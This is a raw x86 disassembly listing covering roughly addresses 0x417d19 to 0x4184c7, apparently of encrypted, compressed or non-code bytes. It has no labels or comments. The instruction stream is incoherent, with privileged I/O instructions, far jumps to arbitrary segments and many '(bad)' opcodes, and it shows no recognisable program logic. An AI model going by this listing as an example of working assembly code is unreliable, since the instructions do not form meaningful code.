  417d19:	cwde   
  417d1a:	fdivr  QWORD PTR [edx-0x683e9ba]
  417d20:	out    dx,al
  417d21:	and    eax,0x257077a6
  417d26:	out    0x5,eax
  417d28:	inc    ecx
  417d29:	and    DWORD PTR [ebx],edx
  417d2b:	loopne 0x417cb9
  417d2d:	or     al,0xcd
  417d2f:	call   0x372e3585
  417d34:	dec    ecx
  417d35:	push   esp
  417d36:	cdq    
  417d37:	ror    BYTE PTR [esi-0x2b827820],1
  417d3d:	jl     0x417d92
  417d3f:	scas   eax,DWORD PTR es:[edi]
  417d40:	adc    bl,dh
  417d42:	mov    dh,BYTE PTR [ecx]
  417d44:	adc    DWORD PTR [ecx],ebp
  417d46:	jg     0x417ce2
  417d48:	sbb    eax,0x127692d9
  417d4d:	retf   
  417d4e:	in     al,dx
  417d4f:	jle    0x417d96
  417d51:	cli    
  417d52:	adc    eax,0xbaf690ce
  417d57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417d58:	inc    edi
  417d59:	hlt    
  417d5a:	mov    esi,0x24960614
  417d5f:	pop    ss
  417d60:	xchg   ecx,eax
  417d61:	dec    ebp
  417d62:	cmp    dh,BYTE PTR [ebx-0x65]
  417d65:	imul   edi,edx,0x89332412
  417d6b:	adc    al,0x4d
  417d6d:	test   DWORD PTR [edx],0xc145d10d
  417d73:	sub    eax,0x1974791e
  417d78:	sbb    DWORD PTR [ecx+0x76],eax
  417d7b:	pop    eax
  417d7c:	cli    
  417d7d:	push   0xffffffbc
  417d7f:	lods   al,BYTE PTR ds:[esi]
  417d80:	dec    ebp
  417d81:	ins    DWORD PTR es:[edi],dx
  417d82:	xchg   bh,bh
  417d84:	fadd   QWORD PTR [ebx-0x4e]
  417d87:	mov    edi,0x168fa57
  417d8c:	test   al,0x43
  417d8e:	(bad)  
  417d8f:	sub    eax,0x157a5ba2
  417d94:	pop    es
  417d95:	push   edi
  417d96:	(bad)  
  417d97:	in     eax,0x32
  417d99:	test   al,0xab
  417d9b:	rol    DWORD PTR [eax+0x46],1
  417d9e:	pcmpeqd mm5,QWORD PTR [ecx+0x493ad467]
  417da5:	in     eax,0x21
  417da7:	push   esp
  417da8:	adc    ch,BYTE PTR [eax-0x6a4481ce]
  417dae:	fs ret 
  417db0:	shl    DWORD PTR [edi-0x1bf2f417],0x8d
  417db7:	(bad)  
  417db8:	enter  0x2bd7,0x93
  417dbc:	dec    esp
  417dbd:	jle    0x417e22
  417dbf:	shr    DWORD PTR [ecx],cl
  417dc1:	outs   dx,BYTE PTR ds:[esi]
  417dc2:	not    BYTE PTR [ebp-0x7b]
  417dc5:	jne    0x417df6
  417dc7:	in     al,dx
  417dc8:	in     eax,dx
  417dc9:	scas   eax,DWORD PTR es:[edi]
  417dca:	dec    esp
  417dcb:	clc    
  417dcc:	cmp    al,0xc6
  417dce:	add    ebp,edx
  417dd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417dd1:	xor    BYTE PTR [eax+0x5c],ah
  417dd4:	mov    edi,0x28531f9a
  417dd9:	stos   BYTE PTR es:[edi],al
  417dda:	pop    ebx
  417ddb:	xchg   DWORD PTR [esi+ebp*4+0x5d],eax
  417ddf:	inc    edi
  417de0:	and    BYTE PTR [edx-0x78],dh
  417de3:	mov    cs,WORD PTR [esi+0x68]
  417de6:	sbb    ah,BYTE PTR ds:0x63fc3bea
  417dec:	push   0xa1d9cfa4
  417df1:	aas    
  417df2:	shl    edi,1
  417df4:	cmp    eax,DWORD PTR [eax]
  417df6:	sbb    esp,DWORD PTR [edi]
  417df8:	aam    0x98
  417dfa:	xchg   edi,eax
  417dfb:	xlat   BYTE PTR ds:[ebx]
  417dfc:	inc    esi
  417dfd:	clc    
  417dfe:	pop    esi
  417dff:	stos   BYTE PTR es:[edi],al
  417e00:	mov    ch,0x5d
  417e02:	push   ds
  417e03:	cwde   
  417e04:	je     0x417e35
  417e06:	or     esi,esi
  417e08:	mov    DWORD PTR [eax],eax
  417e0a:	adc    bh,al
  417e0c:	sbb    eax,0xfbb40c2a
  417e11:	and    eax,0xb4056a1f
  417e16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e17:	lods   eax,DWORD PTR ds:[esi]
  417e18:	jno    0x417e4a
  417e1a:	int3   
  417e1b:	ins    DWORD PTR es:[edi],dx
  417e1c:	cmp    dl,BYTE PTR [ecx+0x3b97d6d5]
  417e22:	out    0x56,al
  417e24:	mov    ds:0xd3778a81,al
  417e29:	lods   al,BYTE PTR ds:[esi]
  417e2a:	out    dx,al
  417e2b:	ret    0xfaf3
  417e2e:	enter  0x2120,0x68
  417e32:	jl     0x417e45
  417e34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e35:	in     al,dx
  417e36:	clc    
  417e37:	fnsave [ecx+edi*2]
  417e3a:	and    dh,dh
  417e3c:	sub    BYTE PTR [ebp+0x1a],bl
  417e3f:	mov    eax,0x1096f0b0
  417e44:	clc    
  417e45:	pusha  
  417e46:	xchg   edx,edx
  417e48:	pop    ebp
  417e49:	mov    BYTE PTR [ebp-0x7f],al
  417e4c:	cmp    DWORD PTR [esi-0x6cbd882b],edx
  417e52:	jnp    0x417e47
  417e54:	fs pop ebx
  417e56:	hlt    
  417e57:	mov    edx,0xcc8628ac
  417e5c:	mov    cl,BYTE PTR [eax+0x7b5a2e26]
  417e62:	aad    0xfb
  417e64:	repz dec esp
  417e66:	dec    edx
  417e67:	lock not DWORD PTR [esi+0x195af32d]
  417e6e:	xchg   ecx,eax
  417e6f:	mov    dl,0x53
  417e71:	xor    BYTE PTR [eax+0x392945a1],0x3
  417e78:	sbb    BYTE PTR [ecx+0x602e2813],0x75
  417e7f:	dec    esp
  417e80:	nop
  417e81:	(bad)  
  417e82:	fild   QWORD PTR [edi+0x79f0b015]
  417e88:	mov    edx,0x7e2f8a0c
  417e8d:	dec    esp
  417e8e:	push   eax
  417e8f:	test   DWORD PTR [ecx],0x70fae406
  417e95:	mov    edx,0x6bb37538
  417e9a:	cmp    eax,0x408e88b3
  417e9f:	in     eax,dx
  417ea0:	iret   
  417ea1:	fs ss ja 0x417e83
  417ea5:	(bad)  
  417ea6:	cmp    edx,esp
  417ea8:	ja     0x417e66
  417eaa:	dec    edi
  417eab:	into   
  417eac:	pop    ecx
  417ead:	add    DWORD PTR [edx],ebp
  417eaf:	mov    BYTE PTR [esi-0x58],ch
  417eb2:	scas   al,BYTE PTR es:[edi]
  417eb3:	jecxz  0x417ec6
  417eb5:	mov    ebp,DWORD PTR [ebp-0x347914ca]
  417ebb:	stos   BYTE PTR es:[edi],al
  417ebc:	emms   
  417ebe:	inc    esp
  417ebf:	add    eax,DWORD PTR [edi+0x68]
  417ec2:	stos   DWORD PTR es:[edi],eax
  417ec3:	pusha  
  417ec4:	push   ss
  417ec5:	jmp    0xb7e4:0x9d6f48a0
  417ecc:	cli    
  417ecd:	sbb    DWORD PTR [ebx-0x4d],esi
  417ed0:	fnstcw WORD PTR [ebx]
  417ed2:	sub    eax,0xca5995c
  417ed7:	push   esi
  417ed8:	xor    ebx,DWORD PTR [edx+0x54]
  417edb:	jle    0x417efa
  417edd:	sub    eax,0x22349386
  417ee2:	sbb    BYTE PTR [edx],ch
  417ee4:	scas   al,BYTE PTR es:[edi]
  417ee5:	or     BYTE PTR ds:0x3387908f,dl
  417eeb:	xchg   ecx,eax
  417eec:	xor    al,0xfe
  417eee:	pop    esp
  417eef:	jns    0x417eee
  417ef1:	into   
  417ef2:	fdiv   QWORD PTR [ecx]
  417ef4:	xor    DWORD PTR [esi+0x59],esp
  417ef7:	test   esi,eax
  417ef9:	shl    BYTE PTR [ebx],1
  417efb:	retf   
  417efc:	xor    eax,0xf2eb8f38
  417f01:	add    dh,cl
  417f03:	pop    eax
  417f04:	jmp    0x8b94415c
  417f09:	addr16 cli 
  417f0b:	inc    esi
  417f0c:	push   cs
  417f0d:	arpl   bx,bx
  417f0f:	cmp    cl,BYTE PTR [esi-0x53325625]
  417f15:	adc    al,0x34
  417f17:	int3   
  417f18:	add    al,ch
  417f1a:	xchg   ebp,eax
  417f1b:	dec    edx
  417f1c:	test   al,0x95
  417f1e:	or     eax,0xb4c00191
  417f23:	mov    esp,0x38b9a68e
  417f28:	adc    al,0xda
  417f2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417f2b:	div    BYTE PTR [edi+eax*2-0x5]
  417f2f:	mov    ah,0x4e
  417f31:	in     eax,0x89
  417f33:	aam    0x9c
  417f35:	or     dl,BYTE PTR [esi+0x3f24dda0]
  417f3b:	dec    esp
  417f3c:	js     0x417ed8
  417f3e:	repnz adc eax,0x4c5b9c3b
  417f44:	fisub  WORD PTR ds:0x26a8f359
  417f4a:	div    eax
  417f4c:	fs inc edx
  417f4e:	mov    ecx,0xb709c5c5
  417f53:	push   esp
  417f54:	cmp    edi,DWORD PTR [ebx-0x76]
  417f57:	popa   
  417f58:	sub    BYTE PTR [edi],ah
  417f5a:	jmp    0x3678:0xbd4e47fc
  417f61:	ror    ebx,0x33
  417f64:	in     eax,0xed
  417f66:	adc    ah,BYTE PTR [ebx]
  417f68:	les    ecx,FWORD PTR [ecx]
  417f6a:	shl    DWORD PTR ds:0xdf0bf07d,1
  417f70:	test   BYTE PTR [eax],dl
  417f72:	pop    ebx
  417f73:	mov    WORD PTR [esp+ebp*4+0x1887925d],es
  417f7a:	lds    eax,FWORD PTR [ebx]
  417f7c:	lea    ebp,[ebx+0x71f50c6f]
  417f82:	sbb    bl,BYTE PTR [ebp-0x7ace2931]
  417f88:	jmp    0xc3ac5f47
  417f8d:	dec    edi
  417f8e:	push   edi
  417f8f:	es adc eax,0xbdb5555d
  417f95:	xchg   esi,eax
  417f96:	mov    eax,0xe5d94440
  417f9b:	les    esi,FWORD PTR [esi-0x31ab0f]
  417fa1:	arpl   WORD PTR [ebx+esi*4-0x72],di
  417fa5:	popf   
  417fa6:	cmp    dh,BYTE PTR [esi+0x3e]
  417fa9:	sbb    eax,0x8c5cb46a
  417fae:	loopne 0x417fdc
  417fb0:	out    dx,eax
  417fb1:	sub    BYTE PTR [ebp+0x2c],cl
  417fb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417fb5:	sub    DWORD PTR [ebx+0x24fca340],eax
  417fbb:	aad    0x70
  417fbd:	cmp    al,0x60
  417fbf:	neg    esp
  417fc1:	call   0xe9d3:0x76753e4f
  417fc8:	sbb    BYTE PTR [ecx-0x79d5683f],0xe
  417fcf:	sbb    bl,cl
  417fd1:	mov    dh,0x25
  417fd3:	call   0x20a8c59b
  417fd8:	or     BYTE PTR [ecx+0x59],bh
  417fdb:	pop    edx
  417fdc:	xor    eax,0x6fb8a7e6
  417fe1:	imul   esi,DWORD PTR [edi],0xffffffa0
  417fe4:	or     al,0x78
  417fe6:	cmp    esi,DWORD PTR [esi+0x54]
  417fe9:	repz adc eax,0xfad409aa
  417fef:	mov    bh,0x81
  417ff1:	fcom   QWORD PTR [edi-0x7c]
  417ff4:	xor    DWORD PTR [ebx+eiz*2-0x22545354],edx
  417ffb:	mov    ebp,0xb825f30
  418000:	adc    eax,0x818ab6e9
  418005:	test   BYTE PTR [ebx+0x11],dl
  418008:	arpl   di,si
  41800a:	xchg   BYTE PTR [esi],dl
  41800c:	cli    
  41800d:	div    DWORD PTR [edx+0x6a8712db]
  418013:	ret    
  418014:	(bad)  
  418015:	dec    esp
  418016:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418017:	add    BYTE PTR [ebx-0x1e],ch
  41801a:	in     al,0x5f
  41801c:	jb     0x418055
  41801e:	xor    esi,DWORD PTR [edx-0x5d]
  418021:	sbb    al,0xbe
  418023:	je     0x417fdc
  418025:	push   0x4e
  418027:	inc    edx
  418028:	outs   dx,DWORD PTR ds:[esi]
  418029:	push   esi
  41802a:	popa   
  41802b:	repz mov ds:0x9104f396,al
  418031:	push   edx
  418032:	fwait
  418033:	xchg   ecx,eax
  418034:	cs dec ebp
  418036:	cmp    BYTE PTR [edi+0x1de41042],ah
  41803c:	ins    BYTE PTR es:[edi],dx
  41803d:	fwait
  41803e:	adc    al,0x87
  418040:	loop   0x41800e
  418042:	adc    ecx,DWORD PTR [edx]
  418044:	stos   BYTE PTR es:[edi],al
  418045:	push   ds
  418046:	sub    BYTE PTR [eax+0x6f],cl
  418049:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41804a:	repnz popf 
  41804c:	mov    bl,cl
  41804e:	mov    BYTE PTR [ecx+0x20],bh
  418051:	pusha  
  418052:	loopne 0x4180cc
  418054:	jns    0x41801b
  418056:	stos   DWORD PTR es:[edi],eax
  418057:	dec    eax
  418058:	cs push ds
  41805a:	sbb    BYTE PTR [ebp-0x35ab66bc],0xa4
  418061:	mov    BYTE PTR [edx+ebx*4-0x409dfe7e],bl
  418068:	push   eax
  418069:	mov    fs,WORD PTR [ecx+edi*8]
  41806c:	xor    al,0xcd
  41806e:	inc    ebp
  41806f:	add    eax,0xd4fd85f7
  418074:	xor    eax,0xccece52e
  418079:	and    DWORD PTR [ebx],esp
  41807b:	aas    
  41807c:	push   ecx
  41807d:	xor    DWORD PTR [ecx],edi
  41807f:	pop    ss
  418080:	push   cs
  418081:	mov    ebx,0xf5b35fdf
  418086:	lahf   
  418087:	adc    al,0xd1
  418089:	dec    ebp
  41808a:	or     DWORD PTR [edx-0x27967671],esp
  418090:	cmc    
  418091:	retf   0x7eb7
  418094:	test   al,0xad
  418096:	aaa    
  418097:	fistp  DWORD PTR [ebx-0x6344f0ab]
  41809d:	and    ebx,DWORD PTR [esi+0x6c]
  4180a0:	sbb    esi,DWORD PTR [ecx+esi*4]
  4180a3:	sub    BYTE PTR [esi+eax*1+0x5485cce9],0x69
  4180ab:	inc    ebp
  4180ac:	mov    al,0xc6
  4180ae:	sti    
  4180af:	lea    esi,[ecx+eax*8]
  4180b2:	sub    dh,BYTE PTR [edx-0x2]
  4180b5:	hlt    
  4180b6:	mov    esi,0x3c88ddcb
  4180bb:	fs add BYTE PTR ss:[edx-0x17],ch
  4180c0:	jmp    0x1374:0xdceb1cf
  4180c7:	pop    ebx
  4180c8:	mov    ebp,0xded7f3ce
  4180cd:	cmp    ch,BYTE PTR [eax]
  4180cf:	push   ebp
  4180d0:	fld    TBYTE PTR ds:0x2f8a9748
  4180d6:	clc    
  4180d7:	jg     0x41811e
  4180d9:	ret    
  4180da:	mov    es,WORD PTR [esp+ebp*1]
  4180dd:	lods   al,BYTE PTR ds:[esi]
  4180de:	jp     0x4180a6
  4180e0:	add    edi,ebx
  4180e2:	ins    DWORD PTR es:[edi],dx
  4180e3:	loope  0x41810e
  4180e5:	sbb    bl,BYTE PTR [ebp-0x609c24b9]
  4180eb:	jbe    0x418082
  4180ed:	pop    es
  4180ee:	nop
  4180ef:	mov    ebp,DWORD PTR [ecx+0x3b842d63]
  4180f5:	aaa    
  4180f6:	mov    dh,0x8d
  4180f8:	mov    eax,ds:0x5839783e
  4180fd:	mov    WORD PTR [edx],fs
  4180ff:	les    ebx,FWORD PTR [ebp-0x73]
  418102:	loopne 0x418140
  418104:	sbb    edx,DWORD PTR [esi+0x4ec0d689]
  41810a:	out    0x32,eax
  41810c:	xor    al,0x8d
  41810e:	shl    BYTE PTR ds:0x7d943942,0x72
  418115:	retf   
  418116:	(bad)  
  418117:	xadd   al,dh
  41811a:	inc    eax
  41811b:	or     al,0x86
  41811d:	scas   al,BYTE PTR es:[edi]
  41811e:	and    ebx,DWORD PTR [ebx+0x15560c35]
  418124:	sbb    eax,ebx
  418126:	sar    DWORD PTR [eax+0x51c44f45],0xa7
  41812d:	adc    dl,0xc5
  418130:	loop   0x4180db
  418132:	outs   dx,DWORD PTR ds:[esi]
  418133:	imul   ecx,edx,0x7d
  418136:	cmp    al,0x68
  418138:	cmp    DWORD PTR [ecx],esi
  41813a:	jle    0x418154
  41813c:	or     BYTE PTR [esi+0x8396239],dl
  418142:	addr16 push ebp
  418144:	mov    ch,0x76
  418146:	sbb    DWORD PTR [esi],ecx
  418148:	ret    0x5760
  41814b:	xchg   edi,eax
  41814c:	(bad)
  41814f:	push   es
  418150:	shr    DWORD PTR [ebp+0x2f],cl
  418153:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418154:	sbb    eax,0xabc5ef1
  418159:	xchg   edx,eax
  41815a:	and    esp,DWORD PTR ds:0x7b64d7e7
  418160:	sbb    DWORD PTR [ebx],0x122d393f
  418166:	adc    eax,0x2d601440
  41816b:	popf   
  41816c:	arpl   sp,cx
  41816e:	addr16 (bad) 
  418171:	cmp    bh,BYTE PTR [edx]
  418173:	push   edi
  418174:	jmp    0x418156
  418176:	dec    edx
  418177:	loop   0x418147
  418179:	popf   
  41817a:	cmp    al,0xb9
  41817c:	cmp    eax,0xcfd8f10a
  418181:	call   0xd078d4f6
  418186:	fwait
  418187:	mov    bl,0xe4
  418189:	push   ds
  41818a:	int    0x77
  41818c:	js     0x4181e6
  41818e:	sbb    al,0xc7
  418190:	xchg   DWORD PTR [edi+0x6a17e23b],edx
  418196:	push   ss
  418197:	(bad)  
  418198:	cmp    BYTE PTR [edi],ch
  41819a:	call   DWORD PTR [ebx-0xa]
  41819d:	setp   BYTE PTR [edx-0x5ad90d7f]
  4181a4:	jecxz  0x418152
  4181a6:	aaa    
  4181a7:	es jno 0x418160
  4181aa:	inc    esi
  4181ab:	push   cs
  4181ac:	shl    al,0x54
  4181af:	push   ebp
  4181b0:	adc    al,0x20
  4181b2:	in     al,0x23
  4181b4:	mov    al,ds:0x139858cd
  4181b9:	sub    ebp,DWORD PTR [edi+ebx*4-0x2c]
  4181bd:	mov    eax,ds:0xf561a17a
  4181c2:	pop    ss
  4181c3:	xchg   DWORD PTR [edx+0x1a2ba66c],ebp
  4181c9:	popf   
  4181ca:	adc    bh,ah
  4181cc:	test   esp,ebp
  4181ce:	sub    BYTE PTR [eax],cl
  4181d0:	sub    eax,0xf4deeb73
  4181d5:	clc    
  4181d6:	fwait
  4181d7:	aaa    
  4181d8:	dec    ecx
  4181d9:	icebp  
  4181da:	pop    ecx
  4181db:	jae    0x4181d2
  4181dd:	dec    edx
  4181de:	mov    edi,ss
  4181e0:	add    al,0x5f
  4181e2:	fcom   QWORD PTR [ebp+0xf]
  4181e5:	pop    edx
  4181e6:	inc    edx
  4181e7:	call   0x7c22034d
  4181ec:	xchg   edi,eax
  4181ed:	cdq    
  4181ee:	iret   
  4181ef:	fstp   st(0)
  4181f1:	jae    0x4181a5
  4181f3:	retf   
  4181f4:	cld    
  4181f5:	fs mov ebp,0xeea17125
  4181fb:	fld    QWORD PTR [edx]
  4181fd:	push   ss
  4181fe:	les    ebx,FWORD PTR [ebx-0x71]
  418201:	xchg   ebp,eax
  418202:	fcomp  DWORD PTR [ebp+0x4331dafa]
  418208:	and    edi,DWORD PTR [ecx-0x2]
  41820b:	int3   
  41820c:	in     eax,0x57
  41820e:	and    DWORD PTR [esi],esp
  418210:	inc    esp
  418211:	shl    DWORD PTR [ebx+0x6f],cl
  418214:	sbb    esp,DWORD PTR [edi+0x0]
  418217:	cmp    al,0xf
  418219:	loopne 0x4181c6
  41821b:	hlt    
  41821c:	mov    cl,0xb6
  41821e:	gs retf 0x914e
  418222:	cwde   
  418223:	dec    ecx
  418224:	repz out dx,al
  418226:	xchg   esi,eax
  418227:	push   edx
  418228:	push   ss
  418229:	sub    ebx,DWORD PTR [ebx+0x61196d41]
  41822f:	jecxz  0x41823b
  418231:	sbb    bh,bl
  418233:	aas    
  418234:	pop    edx
  418235:	int3   
  418236:	cdq    
  418237:	push   0x4b
  418239:	pusha  
  41823a:	outs   dx,DWORD PTR ds:[esi]
  41823b:	ret    
  41823c:	(bad)  
  41823d:	sti    
  41823e:	xor    eax,esi
  418240:	in     eax,dx
  418241:	mov    cl,0xfd
  418243:	xor    DWORD PTR [ebx],0xc
  418246:	fcmovnbe st,st(4)
  418248:	add    al,0xa9
  41824a:	shr    bl,cl
  41824c:	mov    ds:0x7bf1d079,al
  418251:	frstor [edi-0x1c]
  418254:	inc    ebx
  418255:	(bad)  
  418257:	mov    al,ds:0x8d14debc
  41825c:	nop
  41825d:	cmc    
  41825e:	sbb    al,0xc4
  418260:	dec    ebx
  418261:	xchg   DWORD PTR [edi-0x15],esp
  418264:	clc    
  418265:	xor    dl,0x88
  418268:	lds    ebx,FWORD PTR [ecx+ebx*1+0x23]
  41826c:	test   al,0x0
  41826e:	jle    0x4182c2
  418270:	inc    eax
  418271:	int3   
  418272:	push   edi
  418273:	mov    eax,ds:0x962046
  418278:	jbe    0x418211
  41827a:	ret    
  41827b:	gs xchg ebp,eax
  41827d:	xor    BYTE PTR [ecx],ch
  41827f:	ret    
  418280:	jno    0x418230
  418282:	and    BYTE PTR [esi-0x45b6e43b],dh
  418288:	mov    edx,0x9f58991f
  41828d:	jge    0x4182ca
  41828f:	jns    0x418259
  418291:	jbe    0x418251
  418293:	or     al,ch
  418295:	sub    dh,BYTE PTR [edi+eax*1+0x58a75e50]
  41829c:	fwait
  41829d:	xchg   edx,eax
  41829e:	inc    ebx
  41829f:	sub    eax,ecx
  4182a1:	jnp    0x4182e6
  4182a3:	cmp    eax,0xa516e9d8
  4182a8:	adc    BYTE PTR [eax],dh
  4182aa:	lods   al,BYTE PTR ds:[esi]
  4182ab:	push   cs
  4182ac:	mov    esi,0x948bf6c5
  4182b1:	mov    ch,0xb8
  4182b3:	jle    0x41823f
  4182b5:	cmp    ebx,DWORD PTR [esi]
  4182b7:	test   eax,0xb408d75b
  4182bc:	sar    al,cl
  4182be:	or     al,0x4e
  4182c0:	stos   DWORD PTR es:[edi],eax
  4182c1:	rol    BYTE PTR [edi-0x657dd9bd],1
  4182c7:	cmp    al,0xb2
  4182c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4182ca:	mov    ah,0x4b
  4182cc:	mov    al,0x0
  4182ce:	(bad)  [ebp+esi*1+0x4b]
  4182d2:	dec    edi
  4182d3:	dec    ebp
  4182d4:	daa    
  4182d5:	mov    ss,WORD PTR [edx]
  4182d7:	pop    esi
  4182d8:	xchg   DWORD PTR [ecx],ecx
  4182da:	cs mov bh,0x3
  4182dd:	mov    ds,WORD PTR [edx]
  4182df:	inc    ecx
  4182e0:	xor    ebp,esi
  4182e2:	dec    DWORD PTR [edi]
  4182e4:	add    edx,DWORD PTR [eax-0xb]
  4182e7:	lods   al,BYTE PTR ds:[esi]
  4182e8:	lahf   
  4182e9:	lods   al,BYTE PTR ds:[esi]
  4182ea:	dec    eax
  4182eb:	test   al,0xee
  4182ed:	xor    ecx,DWORD PTR [edx+0x92b317b]
  4182f3:	fiadd  WORD PTR [ebx-0x3e]
  4182f6:	mov    cs,WORD PTR ds:0x41d0b559
  4182fc:	push   ds
  4182fd:	test   BYTE PTR [edi+0x74c10e2f],cl
  418303:	push   edx
  418304:	xchg   edx,eax
  418305:	cmp    DWORD PTR [ebx-0x3ec1e6c7],esi
  41830b:	add    DWORD PTR [ebx-0x65251588],esi
  418311:	mov    dl,0xae
  418313:	ins    DWORD PTR es:[edi],dx
  418314:	sub    DWORD PTR [ecx],0xffffffdd
  418317:	pop    edi
  418318:	cwde   
  418319:	scas   ax,WORD PTR es:[edi]
  41831b:	dec    esp
  41831c:	lods   al,BYTE PTR ds:[esi]
  41831d:	xchg   edi,eax
  41831e:	pop    eax
  41831f:	cld    
  418320:	mov    ebx,0x42dfab31
  418325:	icebp  
  418326:	mov    bl,0x5e
  418328:	push   edx
  418329:	inc    esp
  41832a:	rol    DWORD PTR [esi*1+0xf9f2955],cl
  418331:	call   0x9c9ae3aa
  418336:	fiadd  DWORD PTR [ecx+0x35f7291f]
  41833c:	aaa    
  41833d:	sub    dh,0x99
  418340:	imul   edi,DWORD PTR [ebx+ebp*4],0x9
  418344:	and    ebx,ecx
  418346:	xchg   ecx,eax
  418347:	or     DWORD PTR [edx+0x44],0xf967f206
  41834e:	fbstp  TBYTE PTR cs:[eax]
  418351:	xor    bl,dl
  418353:	fcom   DWORD PTR [ebx]
  418355:	jg     0x41833f
  418357:	mov    ah,0x63
  418359:	clc    
  41835a:	jecxz  0x418359
  41835c:	scas   eax,DWORD PTR es:[edi]
  41835d:	sahf   
  41835e:	mov    edi,0xbc70616b
  418363:	add    eax,0x4d7c4e07
  418368:	retf   
  418369:	lds    ebp,FWORD PTR ds:0x75c46071
  41836f:	mov    ecx,0x271279cb
  418374:	dec    ebp
  418375:	dec    ebp
  418376:	loope  0x418355
  418378:	ins    DWORD PTR es:[edi],dx
  418379:	rol    BYTE PTR [ecx-0x7f644607],1
  41837f:	cmp    edx,edi
  418381:	mov    ah,0xf0
  418383:	hlt    
  418384:	inc    edx
  418385:	in     eax,dx
  418386:	(bad)  
  418387:	or     al,0xfd
  418389:	jl     0x418371
  41838b:	je     0x418399
  41838d:	dec    eax
  41838e:	arpl   WORD PTR [esp+eax*1-0x165fe265],cx
  418395:	test   al,0xe1
  418397:	lods   al,BYTE PTR ds:[esi]
  418398:	outs   dx,DWORD PTR ds:[esi]
  418399:	inc    eax
  41839a:	std    
  41839b:	pop    ecx
  41839c:	mov    ds:0x56dbb701,eax
  4183a1:	hlt    
  4183a2:	(bad)  
  4183a3:	cmp    dl,BYTE PTR ds:0xacf2bb28
  4183a9:	addr16 mov ebx,ebp
  4183ac:	lea    ecx,[esi+0x528ab38]
  4183b2:	std    
  4183b3:	(bad)  
  4183b4:	mov    al,ds:0x60c9d3ca
  4183b9:	mov    al,0xf3
  4183bb:	fisubr DWORD PTR [eax-0x39]
  4183be:	sar    DWORD PTR [ecx+0x33],1
  4183c1:	mov    ch,0x12
  4183c3:	outs   dx,BYTE PTR ds:[esi]
  4183c4:	add    eax,0xa35464b5
  4183c9:	mov    ecx,0x9054a16b
  4183ce:	in     al,dx
  4183cf:	sbb    dl,bl
  4183d1:	pop    edi
  4183d2:	mov    bl,0xb0
  4183d4:	adc    BYTE PTR [ebp-0x3],dh
  4183d7:	xchg   ebp,eax
  4183d8:	inc    edi
  4183d9:	adc    BYTE PTR [eax-0x1e2ea3a],ah
  4183df:	xchg   BYTE PTR [eax-0x4a],bl
  4183e2:	clc    
  4183e3:	sbb    esp,DWORD PTR [edx]
  4183e5:	pop    esp
  4183e6:	adc    DWORD PTR [esi+0x2077fcfd],edx
  4183ec:	icebp  
  4183ed:	stos   DWORD PTR es:[edi],eax
  4183ee:	mov    ?,eax
  4183f0:	mov    al,ds:0x4bf4cfc7
  4183f5:	jmp    0x5553:0xe58d2515
  4183fc:	sbb    eax,0x77fec1e3
  418401:	out    0xc3,al
  418403:	je     0x418422
  418405:	lahf   
  418406:	pop    ecx
  418407:	ret    
  418408:	inc    edx
  418409:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41840a:	xchg   DWORD PTR [esi+0x59],ebp
  41840d:	push   ebp
  41840e:	out    0x7d,eax
  418410:	pop    edi
  418411:	outs   dx,BYTE PTR ds:[esi]
  418412:	sub    DWORD PTR [esi-0x6f],ebp
  418415:	sbb    DWORD PTR [eax-0x77],0x8b3378da
  41841c:	mov    al,0x42
  41841e:	mov    BYTE PTR [edx],0xf5
  418421:	cmc    
  418422:	jle    0x4183e6
  418424:	xor    eax,0xfe9bfdb3
  418429:	mov    al,ds:0x7ba13e50
  41842e:	xchg   edx,eax
  41842f:	clc    
  418430:	pop    ebp
  418431:	mov    DWORD PTR [edi+0x739808b8],eax
  418437:	ret    
  418438:	mov    WORD PTR [ebx],?
  41843a:	fmul   st(1),st
  41843c:	sbb    ebp,ebp
  41843e:	pop    ds
  41843f:	or     eax,0x76ca93b8
  418444:	sub    BYTE PTR [eax],ah
  418446:	ins    BYTE PTR es:[edi],dx
  418447:	jb     0x41842f
  418449:	cs ja  0x418491
  41844c:	outs   dx,DWORD PTR ds:[esi]
  41844d:	arpl   WORD PTR [edx-0x613be873],di
  418453:	clc    
  418454:	cmc    
  418455:	mov    al,ds:0xd119bc
  41845a:	imul   edx
  41845c:	sahf   
  41845d:	and    bl,al
  41845f:	sub    esi,DWORD PTR [ebp-0x28]
  418462:	icebp  
  418463:	dec    esi
  418464:	sbb    dl,BYTE PTR [edi]
  418466:	adc    bh,BYTE PTR [esi+0x4a71afc5]
  41846c:	sti    
  41846d:	hlt    
  41846e:	les    esi,FWORD PTR [ecx]
  418470:	mov    eax,ds:0x1b5129bf
  418475:	dec    ecx
  418476:	cli    
  418477:	push   ds
  418478:	adc    ebp,DWORD PTR [ecx]
  41847a:	adc    BYTE PTR [edx],dl
  41847c:	jne    0x418409
  41847e:	xor    al,0x56
  418480:	cli    
  418481:	dec    ebx
  418482:	cmp    al,0xf7
  418484:	mov    ebx,0xf2b92029
  418489:	das    
  41848a:	sub    eax,0x9c9522c7
  41848f:	mov    ah,0xcc
  418491:	cwde   
  418492:	xchg   edi,eax
  418493:	push   edi
  418494:	call   0xf49cd621
  418499:	mov    ebp,0xd0b0b1b9
  41849e:	js     0x418420
  4184a0:	iret   
  4184a1:	fmul   DWORD PTR [ebx+0x6a96cd32]
  4184a7:	fidiv  DWORD PTR [esi+0x4b4f48f6]
  4184ad:	loopne 0x41848f
  4184af:	sbb    BYTE PTR [edi+0x46],al
  4184b2:	xor    edi,0xf
  4184b5:	daa    
  4184b6:	dec    eax
  4184b7:	mov    esp,ecx
  4184b9:	adc    DWORD PTR [ebx],ebx
  4184bb:	ret    
  4184bc:	and    DWORD PTR [edi+eax*1-0x57],edi
  4184c0:	push   ds
  4184c1:	pop    esi
  4184c2:	dec    edi
  4184c3:	cvtdq2ps xmm0,xmm0
  4184c6:	xlat   BYTE PTR ds:[ebx]
  4184c7:	mov    dl,0x44
